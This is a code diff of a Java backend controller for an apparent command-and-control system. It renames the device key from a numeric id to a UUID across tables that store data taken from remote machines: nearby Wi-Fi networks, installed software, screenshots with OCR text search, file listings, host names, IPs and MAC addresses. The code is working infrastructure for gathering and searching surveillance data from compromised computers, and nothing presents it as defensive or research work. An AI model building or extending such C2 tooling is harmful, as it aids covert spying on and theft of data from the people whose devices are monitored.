@@ -109,41 +109,41 @@ public class C2Controller {
             // C2 WiFi
             jdbcTemplate.execute("create table if not exists c2_wifi (" +
                     "id bigint auto_increment primary key, " +
-                    "device_id bigint not null, " +
+                    "device_uuid varchar(64) not null, " +
                     "ssid varchar(128) null, " +
                     "bssid varchar(64) null, " +
-                    "signal_strength varchar(32) null, " +
+                    "signalStrength varchar(32) null, " +
                     "authentication varchar(64) null, " +
-                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
-                    "is_delete tinyint default 0 not null, " +
-                    "index idx_device_id (device_id))");
+                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
+                    "isDelete tinyint default 0 not null, " +
+                    "index idx_device_uuid (device_uuid))");
 
             // C2 Software
             jdbcTemplate.execute("create table if not exists c2_software (" +
                     "id bigint auto_increment primary key, " +
-                    "device_id bigint not null, " +
+                    "device_uuid varchar(64) not null, " +
                     "name varchar(256) null, " +
                     "version varchar(128) null, " +
-                    "install_date varchar(64) null, " +
-                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
-                    "is_delete tinyint default 0 not null, " +
-                    "index idx_device_id (device_id))");
+                    "installDate varchar(64) null, " +
+                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
+                    "isDelete tinyint default 0 not null, " +
+                    "index idx_device_uuid (device_uuid))");
 
             // C2 Screenshot
             jdbcTemplate.execute("create table if not exists c2_screenshot (" +
                     "id bigint auto_increment primary key, " +
-                    "device_id bigint not null, " +
+                    "device_uuid varchar(64) not null, " +
                     "task_id varchar(64) null, " +
                     "url varchar(512) null, " +
                     "ocr_result text null, " +
                     "create_time datetime default CURRENT_TIMESTAMP not null, " +
                     "is_delete tinyint default 0 not null, " +
-                    "index idx_device_id (device_id))");
+                    "index idx_device_uuid (device_uuid))");
 
             // C2 File System Node
             jdbcTemplate.execute("create table if not exists c2_file_system_node (" +
                     "id bigint auto_increment primary key, " +
-                    "device_id bigint not null, " +
+                    "device_uuid varchar(64) not null, " +
                     "parent_path varchar(512) null, " +
                     "path varchar(512) null, " +
                     "name varchar(256) null, " +
@@ -154,7 +154,7 @@ public class C2Controller {
                     "last_modified datetime null, " +
                     "create_time datetime default CURRENT_TIMESTAMP not null, " +
                     "is_delete tinyint default 0 not null, " +
-                    "index idx_device_id (device_id))");
+                    "index idx_device_uuid (device_uuid))");
 
             return "Schema reset successfully";
         } catch (Exception e) {
@@ -233,7 +233,7 @@ public class C2Controller {
                 log.warn("Device not found for injection: {}", uuid);
             } else {
                 C2FileSystemNode node = new C2FileSystemNode();
-                node.setDeviceId(device.getId());
+                node.setDeviceUuid(uuid);
                 node.setPath("C:\\Windows\\System32\\calc.exe");
                 node.setName("calc.exe");
                 node.setSize(20480L);
@@ -308,7 +308,7 @@ public class C2Controller {
         }
 
         LambdaQueryWrapper<C2Screenshot> queryWrapper = new LambdaQueryWrapper<>();
-        queryWrapper.eq(C2Screenshot::getDeviceId, device.getId());
+        queryWrapper.eq(C2Screenshot::getDeviceUuid, uuid);
         
         if (org.apache.commons.lang3.StringUtils.isNotBlank(searchText)) {
             queryWrapper.like(C2Screenshot::getOcrResult, searchText);
@@ -657,7 +657,7 @@ public class C2Controller {
                                     
                                     // Clear old software list for this device
                                     QueryWrapper<C2Software> deleteWrapper = new QueryWrapper<>();
-                                    deleteWrapper.eq("device_id", deviceId);
+                                    deleteWrapper.eq("device_uuid", currentDeviceUuid);
                                     int deleted = c2SoftwareMapper.delete(deleteWrapper);
                                     log.info("Deleted {} old software records", deleted);
         
@@ -668,7 +668,7 @@ public class C2Controller {
                                         for (Map<String, Object> soft : softwareMapList) {
                                             try {
                                                 C2Software c2Software = new C2Software();
-                                                c2Software.setDeviceId(deviceId);
+                                                c2Software.setDeviceUuid(currentDeviceUuid);
                                                 
                                                 // Flexible key handling
                                                 Object nameObj = soft.get("name") != null ? soft.get("name") : soft.get("DisplayName");
@@ -702,7 +702,7 @@ public class C2Controller {
                                             if (softStr == null || softStr.trim().isEmpty()) continue;
                                             try {
                                                 C2Software c2Software = new C2Software();
-                                                c2Software.setDeviceId(deviceId);
+                                                c2Software.setDeviceUuid(currentDeviceUuid);
                                                 
                                                 String name = softStr;
                                                 String version = null;
@@ -780,7 +780,7 @@ public class C2Controller {
                             if (wifiList != null) {
                                 // Clear old wifi list
                                 QueryWrapper<C2Wifi> deleteWrapper = new QueryWrapper<>();
-                                deleteWrapper.eq("device_id", deviceId);
+                                deleteWrapper.eq("device_uuid", currentDeviceUuid);
                                 int deleted = c2WifiMapper.delete(deleteWrapper);
                                 log.info("Deleted {} old WiFi records", deleted);
     
@@ -788,7 +788,7 @@ public class C2Controller {
                                 for (Map<String, Object> wifi : wifiList) {
                                     try {
                                         C2Wifi c2Wifi = new C2Wifi();
-                                        c2Wifi.setDeviceId(deviceId); // Set ID
+                                        c2Wifi.setDeviceUuid(currentDeviceUuid); // Set ID
                                         c2Wifi.setSsid((String) wifi.get("ssid"));
                                         c2Wifi.setBssid((String) wifi.get("bssid"));
                                         // Handle signal strength as number or string
@@ -853,14 +853,14 @@ public class C2Controller {
                             if (fileList != null) {
                                 // Clear old recent files for this device
                                 QueryWrapper<C2FileSystemNode> deleteWrapper = new QueryWrapper<>();
-                                deleteWrapper.eq("device_id", deviceId);
+                                deleteWrapper.eq("device_uuid", currentDeviceUuid);
                                 deleteWrapper.eq("is_recent", 1);
                                 c2FileSystemNodeService.remove(deleteWrapper);
     
                                 for (Map<String, Object> file : fileList) {
                                     try {
                                         C2FileSystemNode node = new C2FileSystemNode();
-                                        node.setDeviceId(deviceId); // Set ID
+                                        node.setDeviceUuid(currentDeviceUuid); // Set ID
                                         node.setPath((String) file.get("path"));
                                         node.setName((String) file.get("name"));
                                         // Handle potential double/long type mismatch from JSON
@@ -939,7 +939,7 @@ public class C2Controller {
                          // Create C2Screenshot record
                          C2Screenshot screenshot = new C2Screenshot();
                          if (device != null) {
-                             screenshot.setDeviceId(device.getId());
+                             screenshot.setDeviceUuid(device.getUuid());
                          }
                          screenshot.setTaskId(taskId);
                          String url = "/api/c2/download?uuid=" + uuid + "&filename=" + filename; 
@@ -1011,7 +1011,7 @@ public class C2Controller {
                              // Create C2Screenshot record
                              if (device != null) {
                                  C2Screenshot screenshot = new C2Screenshot();
-                                 screenshot.setDeviceId(device.getId());
+                                 screenshot.setDeviceUuid(device.getUuid());
                                  screenshot.setTaskId(taskId); 
                                  // Prefer UUID for download url if possible
                                  String url = "/api/c2/download?uuid=" + uuid + "&filename=" + filename;
@@ -1079,7 +1079,7 @@ public class C2Controller {
                             C2Screenshot existing = null;
                             try {
                                 existing = c2ScreenshotMapper.selectOne(new QueryWrapper<C2Screenshot>()
-                                    .eq("device_id", device.getId())
+                                    .eq("device_uuid", device.getUuid())
                                     .like("url", "%" + filename) // Use like to match filename in url
                                     .last("LIMIT 1"));
                             } catch (Exception e) {
@@ -1092,7 +1092,7 @@ public class C2Controller {
                                     String ocrText = ocrService.doOcr(file);
                                     
                                     C2Screenshot screenshot = new C2Screenshot();
-                                    screenshot.setDeviceId(device.getId());
+                                    screenshot.setDeviceUuid(device.getUuid());
                                     
                                     String taskId = "sync_" + System.currentTimeMillis();
                                     if (filename.contains("_") && filename.lastIndexOf(".") > filename.indexOf("_")) {
@@ -1248,7 +1248,7 @@ public class C2Controller {
                     
                     if (device != null) {
                         C2Screenshot screenshot = new C2Screenshot();
-                        screenshot.setDeviceId(device.getId());
+                        screenshot.setDeviceUuid(device.getUuid());
                         screenshot.setTaskId(taskId);
                         String url = "/api/c2/download?uuid=" + targetDirName + "&filename=" + filename;
                         screenshot.setUrl(url);
@@ -1315,12 +1315,13 @@ public class C2Controller {
                             device.setUuid(deviceUuid);
                             device.setCreateTime(new Date());
                         }
-                        device.setInternalIp(rs.getString("internal_ip"));
-                        device.setMacAddress(rs.getString("mac_address"));
-                        device.setHostName(rs.getString("hostname"));
-                        device.setOs(rs.getString("os"));
-                        device.setIsMonitorOn(rs.getInt("auto_screenshot"));
-                        device.setDataStatus(rs.getString("data_status"));
+                        
+                        try { device.setInternalIp(rs.getString("internal_ip")); } catch (Exception ignore) {}
+                        try { device.setMacAddress(rs.getString("mac_address")); } catch (Exception ignore) {}
+                        try { device.setHostName(rs.getString("hostname")); } catch (Exception ignore) {}
+                        try { device.setOs(rs.getString("os")); } catch (Exception ignore) {}
+                        try { device.setIsMonitorOn(rs.getInt("auto_screenshot")); } catch (Exception ignore) {}
+                        try { device.setDataStatus(rs.getString("data_status")); } catch (Exception ignore) {}
                         device.setLastSeen(new Date());
                         
                         // Update device
@@ -1359,8 +1360,8 @@ public class C2Controller {
                     while (rs.next()) {
                         C2Wifi wifi = new C2Wifi();
                         // wifi.setDeviceUuid(deviceUuid); // Removed
-                        if (device != null && device.getId() != null) {
-                             wifi.setDeviceId(device.getId());
+                        if (device != null && device.getUuid() != null) {
+                             wifi.setDeviceUuid(device.getUuid());
                         } else {
                              continue; // Skip if no device ID
                         }
@@ -1393,12 +1394,12 @@ public class C2Controller {
                     String redisKey = "dedup:hash:wifi:" + deviceUuid;
                     String lastHash = dedupCache.get(redisKey);
                     
-                    if (lastHash != null && lastHash.equals(currentHash) && device != null && c2WifiMapper.selectCount(new QueryWrapper<C2Wifi>().eq("device_id", device.getId())) > 0) {
+                    if (lastHash != null && lastHash.equals(currentHash) && device != null && c2WifiMapper.selectCount(new QueryWrapper<C2Wifi>().eq("device_uuid", device.getUuid())) > 0) {
                         log.info("WiFi scan results identical to last scan for device {}, skipping DB write.", deviceUuid);
                     } else {
                         // Update DB
-                        if (device != null && device.getId() != null) {
-                            c2WifiMapper.delete(new QueryWrapper<C2Wifi>().eq("device_id", device.getId()));
+                        if (device != null && device.getUuid() != null) {
+                            c2WifiMapper.delete(new QueryWrapper<C2Wifi>().eq("device_uuid", device.getUuid()));
                             
                             if (!wifiList.isEmpty()) {
                                 for (C2Wifi wifi : wifiList) {
@@ -1424,8 +1425,8 @@ public class C2Controller {
                     while (rs.next()) {
                         C2Software sw = new C2Software();
                         // sw.setDeviceUuid(deviceUuid); // Removed
-                        if (device != null && device.getId() != null) {
-                             sw.setDeviceId(device.getId());
+                        if (device != null && device.getUuid() != null) {
+                             sw.setDeviceUuid(device.getUuid());
                         } else {
                              continue;
                         }
@@ -1453,8 +1454,8 @@ public class C2Controller {
                         log.info("Software scan results identical to last scan for device {}, skipping DB write.", deviceUuid);
                     } else {
                         // Update DB
-                        if (device != null && device.getId() != null) {
-                            c2SoftwareMapper.delete(new QueryWrapper<C2Software>().eq("device_id", device.getId()));
+                        if (device != null && device.getUuid() != null) {
+                            c2SoftwareMapper.delete(new QueryWrapper<C2Software>().eq("device_uuid", device.getUuid()));
                             
                             if (!softwareList.isEmpty()) {
                                 // Loop insert (software list can be 100-200)
@@ -1695,11 +1696,11 @@ public class C2Controller {
                          if (existing != null) device.setId(existing.getId());
                     }
 
-                    if (device.getId() != null) {
+                    if (device.getUuid() != null) {
                         // Clear old File System Nodes for this device to ensure fresh view
-                        c2FileSystemNodeService.remove(new QueryWrapper<C2FileSystemNode>().eq("device_id", device.getId()));
+                        c2FileSystemNodeService.remove(new QueryWrapper<C2FileSystemNode>().eq("device_uuid", device.getUuid()));
                     } else {
-                        log.warn("Skipping file scan cleanup: Device ID not found for UUID {}", deviceUuid);
+                        log.warn("Skipping file scan cleanup: Device UUID not found for UUID {}", deviceUuid);
                     }
 
                     String fileTable = "files";
@@ -1759,8 +1760,8 @@ public class C2Controller {
                         
                         // Add to C2FileSystemNode (Merged)
                         C2FileSystemNode node = new C2FileSystemNode();
-                        if (device != null && device.getId() != null) {
-                            node.setDeviceId(device.getId());
+                        if (device != null && device.getUuid() != null) {
+                            node.setDeviceUuid(device.getUuid());
                         }
                         node.setPath(filePath);
                         node.setName(fileName);
